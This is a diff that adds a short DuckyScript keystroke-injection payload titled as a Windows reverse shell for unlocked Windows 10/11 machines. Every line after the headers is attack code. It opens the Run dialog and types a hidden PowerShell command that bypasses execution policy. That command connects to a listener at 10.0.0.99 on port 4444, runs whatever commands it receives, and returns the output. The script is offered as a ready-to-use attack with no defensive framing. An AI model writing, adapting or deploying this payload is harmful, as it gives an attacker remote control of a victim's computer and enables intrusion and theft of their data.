@@ -1,0 +1,9 @@
+REM Title: Windows reverse shell to HexBox
+REM Target: Windows 10/11 unlocked
+ATTACKMODE HID STORAGE
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -w h -nop -ep bypass -c "$c=New-Object Net.Sockets.TCPClient('10.0.0.99',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($rb,0,$rb.Length);$s.Flush()}"
+ENTER
